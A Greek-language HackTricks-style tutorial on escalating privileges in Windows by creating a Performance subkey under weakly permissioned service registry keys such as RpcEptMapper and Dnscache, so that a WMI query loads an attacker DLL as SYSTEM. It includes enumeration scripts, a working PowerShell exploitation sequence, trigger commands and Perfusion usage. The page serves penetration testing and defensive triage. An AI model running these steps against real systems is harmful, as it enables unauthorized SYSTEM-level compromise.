# Δικαίωμα AppendData/AddSubdirectory στο Service Registry

{{#include ../../banners/hacktricks-training.md}}

**Η αρχική ανάρτηση βρίσκεται εδώ:** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Σύνοψη

Αν έχετε μόνο δικαίωμα **`Create Subkey`** / **`AppendData/AddSubdirectory`** σε ένα service registry key, αυτό εξακολουθεί να αποτελεί καλή ένδειξη για privesc. Συνήθως **δεν μπορείτε** να αντικαταστήσετε απευθείας τα `ImagePath`, `ServiceDll` ή άλλες υπάρχουσες τιμές, αλλά ενδέχεται να μπορείτε να δημιουργήσετε ένα child key **`Performance`** κάτω από:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Οποιοδήποτε άλλο **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key όπου το token σας διαθέτει **`KEY_CREATE_SUB_KEY`**

Το trick είναι ότι τα Windows εξακολουθούν να υποστηρίζουν το παλαιότερο μοντέλο registration **PerfLib V1**. Αν ένα service διαθέτει subkey **`Performance`**, τα Windows μπορούν να φορτώσουν ένα DLL από εκεί όταν ένας performance counter consumer ζητήσει δεδομένα.

Σύμφωνα με την τεκμηρίωση της Microsoft, το ελάχιστο registration είναι:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Άρα, το offensive συμπέρασμα είναι: **μην απορρίπτετε ένα εύρημα σε service registry μόνο και μόνο επειδή έχετε μόνο `CreateSubKey` αντί για `SetValue`**.<sup>[[3]](#references)</sup>

## Γιατί αυτό αρκεί για code execution

Το subkey `Performance` συνήθως **δεν υπάρχει by default** σε αυτά τα services, επομένως το **`KEY_CREATE_SUB_KEY`** είναι το primitive που χρειάζεστε. Μόλις δημιουργηθεί το key και περιέχει `Library`/`Open`/`Collect`/`Close`, οποιοσδήποτε **performance counter consumer** μπορεί να κάνει trigger το DLL load.<sup>[[3]](#references)</sup>

Μερικές σημαντικές λεπτομέρειες:

- Η τιμή **`Library`** μπορεί να δείχνει σε **πλήρες DLL path**.
- Το DLL πρέπει να κάνει export τα **`OpenPerfData`**, **`CollectPerfData`** και **`ClosePerfData`** και να επιστρέφει `ERROR_SUCCESS`.
- Ο κώδικας εκτελείται στο **context του consumer**, **όχι απαραίτητα μέσα στο ίδιο το vulnerable service process**.
- Στην κλασική περίπτωση `RpcEptMapper` / `Dnscache`, ένα **WMI performance query** μπορεί να κάνει το **`wmiprvse.exe`** να φορτώσει το DLL ως **`NT AUTHORITY\SYSTEM`**.

Γι' αυτό το primitive είναι εύκολο να παραβλεφθεί κατά το triage: το parent service key δεν είναι «πλήρως writable», αλλά εξακολουθεί να μπορεί να γίνει weaponized.

## Γρήγορο enumeration

Χειροκίνητος spot-check με **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Παράδειγμα PowerShell για αναζήτηση principals χαμηλών προνομίων με **`CreateSubKey`** σε service keys:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Χρήσιμα εργαλεία:

- **PrivescCheck**: Το `Get-ModifiableRegistryPath` δημιουργήθηκε ειδικά για τον εντοπισμό αυτής της κατηγορίας προβλήματος.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: αυτοματοποιεί το DLL drop, το `Performance` registration, το WMI trigger, το token duplication και το cleanup σε παλαιότερους ευάλωτους στόχους (για παράδειγμα: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Ροή εκμετάλλευσης

Δημιουργήστε το subkey `Performance` και συμπληρώστε τις απαιτούμενες τιμές:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Στη συνέχεια ενεργοποιήστε έναν **προνομιούχο** καταναλωτή επιδόσεων. Ένα κλασικό παράδειγμα είναι ένα WMI query πάνω στις κλάσεις `Win32_Perf*`:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Operational notes:

- Η εκκίνηση του **`perfmon.exe`** είναι χρήσιμη για την επαλήθευση ότι η καταχώριση του counter είναι σωστή, αλλά συνήθως φορτώνει το DLL μόνο στο **δικό σας user context**.
- Για ένα πραγματικό LPE, ενεργοποιήστε έναν **privileged** consumer όπως το **WMI**.
- Αν γράφετε το δικό σας exploit, η απευθείας εκκίνηση του `cmd.exe` μέσα από το DLL συνήθως σας αφήνει με shell στο **session 0**. Το `Perfusion` το επιλύει αυτό αντιγράφοντας το privileged token σε μια διεργασία που δημιουργήθηκε σε suspended κατάσταση στο session του attacker.<sup>[[4]](#references)</sup>
- Ταιριάξτε την αρχιτεκτονική του DLL με αυτήν του target consumer (**x64 σε x64 συστήματα**).

## Σημειώσεις έκδοσης / πρόσφατες εξελίξεις

Ιστορικά, τα ενσωματωμένα weak keys ήταν:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` και `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

Το `Perfusion` αναφέρει ότι τα updates του **Απριλίου 2021** αφαίρεσαν το εύκολο μονοπάτι exploitation σε ενημερωμένα **Windows 8 / Windows Server 2012**, ενώ τα **Windows 7 / Windows Server 2008 R2** παρέμειναν exploitable μέσω του **`Dnscache`**.<sup>[[4]](#references)</sup>

Αυτό το primitive **δεν είναι μόνο ιστορικό**. Τον **Ιανουάριο του 2025**, η Microsoft διόρθωσε ένα σχετικό ζήτημα στο AD DS, όπου τα μέλη των **`Network Configuration Operators`** μπορούσαν να δημιουργούν subkeys κάτω από τα **`Dnscache`** και **`NetBT`**, και η ίδια ιδέα του **Performance-counter DLL registration** μπορούσε να επαναχρησιμοποιηθεί για την επίτευξη **SYSTEM** σε υποστηριζόμενα συστήματα.<sup>[[2]](#references)</sup>

Επομένως, το σύγχρονο συμπέρασμα είναι γενικό: κάθε φορά που ένας low-privileged principal έχει **`CreateSubKey`** στο **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, ελέγξτε αν ένα child key **`Performance`** αρκεί, πριν απορρίψετε το finding.

## Αναφορές

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
